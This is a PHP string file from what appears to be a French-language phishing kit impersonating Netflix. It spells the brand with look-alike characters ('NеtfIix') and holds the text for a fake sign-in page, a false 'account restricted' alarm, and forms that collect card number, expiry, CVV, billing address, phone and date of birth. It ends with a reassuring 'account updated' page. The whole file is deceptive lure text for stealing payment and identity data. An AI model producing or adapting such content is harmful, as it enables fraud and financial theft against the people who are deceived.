<?php
// HF Jackson_Login_Français
$Fartout = "NеtfIix";
$dokhol= "S'identifier";
$mail= "E-mail";
$Password = "Mot de passe";
$nsit = "E-mail ou mot de passe oublié ?";
$btona = "S'identifier";
$box = 'Se souvenir de moi';
$saybok = "ÉTAPE";
$saybok1 = "DE";
$jdid ="Première visite sur NеtfIix?";
$tsajal = "Inscrivez-vous";
$tasl = "Des questions ? Contactez-nous";
$chorot = "Conditions des cartes cadeaux";
$bla = "Conditions d'utilisation";
$kho = "Déclaration de confidentialité";
$logha = "Le processus ne prend pas plus de 5 minutes.";
/*========[Page_3]==========*/
$title = "Mettre à Jour Les Informations de Votre Compte";
$wrn = "Votre Compte a été Restreint!";
$warn = "Vous Devez Mettre à Jour Les Informations de Votre Compte";
$wbtn = "Mettre à Jour Maintenant";
/*========[Page_2]==========*/
$info  = "Informations de paiement";
$khoroj ="Déconnexion";
$cnfrm = "Mettez à Jour vos Informations de Paiement";
$goli ="Dis M'en Plus";
$cc = "Carte de Crédit";
$nam = "Nom du Titulaire";
$namCC = "Exactement Tel qu'il Apparaît Sur Votre Carte";
$CCnum = "Numéro de La Carte";
$dateCC = "Date D'expiration";
$chhr= "Mois";
$am= "Année";
$cvv = "Code de Décurité";
$chno = "Quel est";
$btn = "Mettre à Jour Les Informations";
$src= "Serveur Sécurisé";
$so2al= "Des Questions?";
$cnt = "Contactez nous.";
$tem = "Conditions D'utilisation";
$prv = "Intimité";
$sn  = "Configurez votre carte de crédit ou de débit";
$digits ="";
/*=======[Page_3]==========*/
$upld = "Mettez à Jour vos Informations de Facturation";
$pr = "Votre adresse de facturation doit correspondre à la méthode de paiement de votre adresse de votre plan d'adhésion.<br>
Nous exigeons également votre date de naissance en tant que mesure de sécurité supplémentaire.";
$bling ="Adresse de Facturation";
$smiya ="Nom Complet";
$kniya ="Prénom";
$adrs1 ="Adresse 1";
$adrs2 ="Adresse 2";
$mdina ="Ville";
$zip ="Code Postal";
$dola ="Pays";
$namra ="Numéro de Téléphone";
$tarikh ="Date de Naissance";
$eml ="E-mail";
$bton ="Mettre à Jour L'Adresse";
/*=======[Page_4]==========*/
$upd ="Votre Compte a été Mis à Jour";
$txt ="Merci de mettre à jour et de confirmer les informations de votre compte.<br>
Vous Pouvez Maintenant Continuer à Vous Connecter et Utiliser Votre Compte Normalement sans Interruption Supplémentaire.";
$final ="Continuer à Vous Connecter";
// HF Jackson_Login_Français
?>